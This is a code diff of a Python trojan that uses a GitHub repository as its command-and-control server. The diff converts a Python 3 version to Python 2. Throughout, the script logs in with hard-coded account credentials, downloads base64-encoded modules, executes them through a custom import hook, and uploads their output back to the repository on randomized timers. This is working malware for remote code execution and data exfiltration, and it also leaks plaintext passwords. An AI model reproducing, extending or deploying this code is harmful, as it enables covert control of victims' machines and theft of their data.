@@ -1,96 +1,134 @@
-import json, base64, sys, time, imp, random, threading, os, encodings.idna
-from queue import Queue
+import json
+import base64
+import sys
+import time
+import imp
+import random
+import threading
+import Queue
+import os
+
 from github3 import login
 
-#### CONFIGURE YOUR SETTINGS HERE ####
-GH_USERNAME = 'ogetlam'
-GH_PASSWORD = 'projet2017ms'
-OWNER = 'ogetlam'
-REPOSITORY = 'cc'
-BRANCH = 'master'
-######################################
+trojan_id = "abc"
 
-trojan_id = "abc"  # unique id for this trojan
-relative_path = "cc/"
-trojan_config = relative_path + "config/{0}.json".format(trojan_id)
-data_path = relative_path + "data/{0}/".format(trojan_id)
-trojan_modules = []
-configured = False
-task_queue = Queue()
+trojan_config = "%s.json" % trojan_id
+data_path     = "data/%s/" % trojan_id
+trojan_modules= []
 
-def connect_to_github():
-	# NOTE: there is also an option to login via tokens (see docs for more info)
-	gh = login(username=GH_USERNAME, password=GH_PASSWORD)
-	repo = gh.repository(OWNER, REPOSITORY)
-	branch = repo.branch(BRANCH)
-
-	return gh, repo, branch
-
-def get_file_contents(filepath):
-	gh, repo, branch = connect_to_github()
-	tree = branch.commit.commit.tree.recurse()
-
-	for filename in tree.tree:
-		if filepath in filename.path:
-			print("[*] Found file {0}".format(filepath))
-			blob = repo.blob(filename._json_data["sha"])
-			return blob.content
-	return None
-
-def get_trojan_config():
-	global configured
-	config_json = get_file_contents(trojan_config)
-	config = json.loads(base64.b64decode(config_json).decode(encoding="utf-8"))
-	configured = True
-
-	for task in config:
-		if task["module"] not in sys.modules:
-			exec("import {0}".format(task["module"]))
-	return config
-
-def store_module_result(data):
-	gh, repo, branch = connect_to_github()
-	remote_path = relative_path + "data/{0}/{1}.data".format(trojan_id, random.randint(1000, 1000000))
-	repo.create_file(remote_path, "[Trojan {0}] Adding data".format(trojan_id), data.encode("utf-8"))
+task_queue    = Queue.Queue()
+configured    = False
 
 class GitImporter(object):
-	def __init__(self):
-		self.current_module_code = ""
 
-	def find_module(self, fullname, path=None):
-		if configured:
-			print("[*] Attemping to retrieve {0}".format(fullname))
-			new_library = get_file_contents(relative_path + "modules/{0}".format(fullname))
+    def __init__(self):
+        
+        self.current_module_code = ""
+        
+    
+    def find_module(self,fullname,path=None):
+        
+        if configured:
+            print "[*] Attempting to retrieve %s" % fullname
+            new_library = get_file_contents("modules/%s" % fullname)
+            
+            if new_library is not None:
+                self.current_module_code = base64.b64decode(new_library)
+                return self
+            
+                
+        return None
 
-			if new_library is not None:
-				self.current_module_code = base64.b64decode(new_library)
-				return self
-		return None
+    def load_module(self,name):
+        
+        module = imp.new_module(name)
+        
+        exec self.current_module_code in module.__dict__
+        
+        sys.modules[name] = module
+        
+        return module
 
-	def load_module(self, name):
-		module = imp.new_module(name)
-		exec(self.current_module_code, module.__dict__)
-		sys.modules[name] = module
 
-		return module
+
+def connect_to_github():
+    gh = login(username="ogetlam",password="0g3tl4m2017")
+    repo = gh.repository("ogetlam","cc")
+    branch = repo.branch("master")    
+    print "Connected"
+    print gh
+    print repo
+    print branch
+
+    return gh,repo,branch
+
+def get_file_contents(filepath):
+    
+    gh,repo,branch = connect_to_github()
+        
+    tree = branch.commit.commit.tree.recurse()
+    print "printing tree"
+    
+    for filename in tree.tree:
+        if filepath in filename.path:
+            print "[*] Found file %s" % filepath       
+            blob = repo.blob(filename._json_data['sha'])
+            return blob.content
+        else :
+        	print "Rien"
+
+    return None
+
+def get_trojan_config():
+    global configured
+    
+    config_json   = get_file_contents(trojan_config)
+    config        = json.loads(base64.b64decode(config_json))
+    configured    = True
+    
+    for task in config:
+        
+        if task['module'] not in sys.modules:
+            
+            exec("import %s" % task['module'])
+            
+    return config
+
+def store_module_result(data):
+    
+    gh,repo,branch = connect_to_github()
+    
+    remote_path = "data/%s/%d.data" % (trojan_id,random.randint(1000,100000))
+                                      
+    repo.create_file(remote_path,"Commit message",base64.b64encode(data))
+
+    return
 
 def module_runner(module):
-	task_queue.put(1)
-	result = sys.modules[module].run()
-	task_queue.get()
 
-	# store the result in the repo
-	store_module_result(result)
+    task_queue.put(1)
+    result = sys.modules[module].run()
+    task_queue.get()
+    
+    # store the result in our repo
+    store_module_result(result)
+    
+    return
 
-sys.meta_path += [GitImporter()]
 
-# main trojan loop
+# main trojan loop    
+sys.meta_path = [GitImporter()]
+
 while True:
-	if task_queue.empty():
-		config = get_trojan_config()
+    
+    if task_queue.empty():
 
-		for task in config:
-			t = threading.Thread(target=module_runner, args=(task['module'],))
-			t.start()
-			time.sleep(random.randint(1, 10))
-	time.sleep(random.randint(1000, 10000))
+        config = get_trojan_config()
+        
+        for task in config:
+            t = threading.Thread(target=module_runner,args=(task['module'],))
+            t.start()
+            time.sleep(random.randint(1,10))
+            
+    time.sleep(random.randint(1000,10000))
+        
